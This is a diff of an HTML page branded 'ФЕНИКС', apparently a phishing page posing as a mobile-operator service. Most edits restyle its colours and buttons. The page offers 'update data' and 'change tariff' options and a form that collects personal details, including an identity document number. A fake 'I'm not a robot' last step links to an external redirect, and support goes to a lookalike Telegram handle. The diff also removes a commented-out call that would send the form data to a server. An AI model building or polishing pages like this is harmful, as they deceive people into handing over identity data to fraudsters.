@@ -7,7 +7,7 @@
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #f9f9f9;
+      background: #f0f4f8;
       margin: 0;
       padding: 20px;
       display: flex;
@@ -16,62 +16,65 @@
     }
     .card {
       background: #fff;
-      padding: 20px;
+      padding: 25px 20px;
       border-radius: 20px;
       box-shadow: 0 4px 12px rgba(0,0,0,0.1);
       max-width: 420px;
       width: 100%;
+      text-align: center;
     }
     h1 {
-      color: #e63946;
-      font-size: 22px;
+      color: #1d4ed8;
+      font-size: 24px;
+      margin-bottom: 25px;
     }
     button {
       display: block;
       width: 100%;
-      padding: 12px;
-      margin: 6px 0;
+      padding: 14px 0;
+      margin: 10px 0;
       border-radius: 12px;
       border: none;
-      background: #e63946;
+      background: #1d4ed8;
       color: #fff;
       font-size: 16px;
       cursor: pointer;
       transition: 0.2s;
     }
-    button:hover { background: #d62828; }
+    button:hover { background: #1e40af; }
+    .back-btn { background: #1e40af; }
+    .back-btn:hover { background: #1e3a8a; }
+    .faq-btn { background: #1d4ed8; }
+    .faq-btn:hover { background: #1e40af; }
     input, select {
       width: 100%;
-      padding: 12px;
-      margin: 10px 0;
+      padding: 14px;
+      margin: 10px 0 15px 0;
       border-radius: 10px;
-      border: 1px solid #ccc;
+      border: 2px solid #1d4ed8;
       font-size: 16px;
+      text-align: center;
+      box-sizing: border-box;
     }
     .hidden { display: none; }
-    .back-btn {
-      background: #6c757d;
-    }
-    .back-btn:hover {
-      background: #495057;
-    }
-    .faq-btn {
-      background: #457b9d;
-    }
-    .faq-btn:hover {
-      background: #1d3557;
-    }
     .success {
       font-size: 18px;
-      color: green;
+      color: #1d4ed8;
       font-weight: bold;
       text-align: center;
+      line-height: 1.5;
     }
+    .success button {
+      margin-top: 15px;
+    }
+    p { margin: 10px 0; text-align: center; }
   </style>
 </head>
 <body>
   <div class="card">
     <h1>ФЕНИКС 🔥</h1>
+
+    <!-- Главное меню -->
     <div id="menu">
       <button onclick="showForm()">📝 Обновить данные</button>
       <button onclick="alertAuth('поменять тариф')">🔄 Поменять тариф</button>
@@ -110,8 +113,9 @@
       </div>
     </form>
 
+    <!-- Успех -->
     <div id="success" class="hidden success">
-      ✅ Данные отправлены!<br>
+      ✅ Данные отправлены!<br><br>
       Последний шаг: <br>
       <a href="https://redirect.figma.site/" target="_blank">
         <button>Я не робот ✅</button>
@@ -120,10 +124,10 @@
 
     <!-- Доп. услуги -->
     <div id="services" class="hidden">
-      <button class="faq-btn" onclick="showFAQ()">❓ Часто задаваемые вопросы</button>
-      <button class="faq-btn" onclick="showInstruction()">ℹ️ Инструкция</button>
+      <button onclick="showFAQ()">❓ Часто задаваемые вопросы</button>
+      <button onclick="showInstruction()">ℹ️ Инструкция</button>
       <a href="https://t.me/MyPhoenlxsupport" target="_blank">
-        <button class="faq-btn">📞 Связаться с техподдержкой</button>
+        <button>📞 Связаться с техподдержкой</button>
       </a>
       <button class="back-btn" onclick="goHome()">↩️ Вернуться назад</button>
     </div>
@@ -189,9 +193,6 @@
         document_number: document.getElementById("document_number").value
       };
       console.log("Отправляем данные:", data);
-
-      // Тут можно сделать fetch() к Python-серверу
-      // fetch("/api/save", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(data)})
 
       hideAll();
       document.getElementById("success").classList.remove("hidden");
